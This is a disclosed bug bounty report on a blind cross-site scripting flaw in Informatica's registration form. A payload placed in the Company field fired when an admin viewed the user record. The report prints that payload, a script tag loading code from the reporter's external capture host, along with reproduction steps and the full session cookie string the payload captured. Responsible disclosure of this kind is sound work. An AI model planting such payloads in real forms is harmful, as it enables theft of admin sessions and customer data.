# Improper Sanitization leads to XSS Fire on admin panel

## Report Details
- **Report ID**: 1011888
- **URL**: https://hackerone.com/reports/1011888
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-10-19T16:07:22.235Z
- **Disclosed**: 2021-08-03T11:32:02.985Z

## Reporter
- **Username**: montypythin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
# Summary
Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html,  the input is vulnerable to XSS. When a payload such as 
```"><script src=https://monty.xss.ht></script>``` 
is put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.

# Steps to reproduce
1) Goto https://accounts.informatica.com/registration.html and create a temporary account
2) Enter a blind xss payload into the Company field
3) Wait until an admin opens the user record
4) Then, the report should be generated ( I used https://xsshunter.com/)

#Supporting Materials
As mentioned, the blind XSS gave me the following IP address  who loaded the admin panel:
████████

The URL of where the payload fired:
https://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded

This cookie:
```
wm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22
```

What the XSS saw:
█████
Note that this is leaking what appears to be another customer's data

The full report:
████████

## Impact

With this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.

## Attachments
No attachments
